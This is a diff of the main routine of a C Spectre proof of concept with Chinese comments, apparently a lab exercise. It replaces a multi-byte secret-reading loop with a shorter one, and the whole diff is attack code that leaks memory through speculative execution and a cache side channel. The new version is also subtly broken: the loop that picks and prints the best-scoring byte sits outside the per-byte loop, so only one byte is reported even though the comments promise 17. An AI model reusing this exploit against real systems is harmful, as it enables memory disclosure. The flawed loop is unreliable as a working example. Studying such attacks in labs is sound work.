@@ -79,56 +79,42 @@ void spectreAttack(size_t index_beyond)
 }
 
 int main() {
-  int i, j;
-  uint8_t s;
-  size_t secret_len = 40;     // 可适当放宽长度
-  char result[100] = {0};     // 初始化为全0，避免残留
-  printf("Starting Spectre attack to read secret...\n\n");
+    int i, m;
+    uint8_t s;
 
-  for (j = 0; j < secret_len; j++) {
-    size_t index_beyond = (size_t)((secret - (char *)buffer) + j);
-    for (i = 0; i < 256; i++) scores[i] = 0;
-    flushSideChannel();
+    // 逐字节读取 secret，共读取 17 个字节
+    for (m = 0; m < 17; m++) {
+        // 计算目标地址：secret 和 buffer 之间的偏移
+        size_t larger_x = (size_t)(secret - (char*)buffer);
 
-    // 攻击轮数建议 ≥ 2000，提高稳定性
-    for (i = 0; i < 2000; i++) {
-      fputs("", stderr);  // 替代 *****，避免污染输出
-      spectreAttack(index_beyond);
-      usleep(100);        // 稍微休眠，减少系统干扰
-      reloadSideChannelImproved();
-    }
+        // 清空缓存侧信道
+        flushSideChannel();
 
-    // 找出得分最高字符
-    int max = 0;
-    for (i = 1; i < 256; i++) {
-      if (scores[i] > scores[max]) max = i;
-    }
+        // 初始化分数数组
+        for (i = 0; i < 256; i++)
+            scores[i] = 0;
 
-    // 输出当前字节结果
-    if (scores[max] >= 5) {
-      result[j] = (char)max;
-      printf("Secret[%02d] = %3d (%c), hit = %d\n", j, max, max, scores[max]);
-    } else {
-      result[j] = '?';  // 不确定结果，补为问号
-      printf("Secret[%02d] = ??? (?), low confidence (%d hits)\n", j, scores[max]);
-    }
-
-    // 可选中止策略（如连续5个都是0，可认为已到末尾）
-    if (max == 0 && scores[max] < 3) {
-      int zero_run = 1;
-      for (int k = 1; k <= 5 && j - k >= 0; k++) {
-        if (result[j - k] != 0 && result[j - k] != '?') {
-          zero_run = 0;
-          break;
+        // 多次执行攻击以统计命中次数
+        for (i = 0; i < 1000; i++) {
+            spectreAttack(larger_x + m);      // 执行 Spectre 攻击，尝试泄露第 m 字节
+            reloadSideChannelImproved();      // 重新加载缓存，进行侧信道探测
         }
-      }
-      if (zero_run) break;  // 多次连续失败，提前终止
     }
-  }
 
-  result[j + 1] = '\0';
-  printf("\nRecovered secret: %s\n", result);
-  return 0;
+    // 从侧信道得分中找出命中次数最多的字节（推测为 secret[m]）
+    int max = 1;
+    for (i = 1; i < 256; i++) {
+        if (scores[max] < scores[i])
+            max = i;
+    }
+
+    // 打印推测出的字节信息
+    printf("Reading secret value at %p = ", (void*)larger_x);
+    printf("The secret value is %d - %c \n", max, max);
+    printf("The number of hits is %d\n", scores[max]);
+
+    return 0;
 }
+
 
 
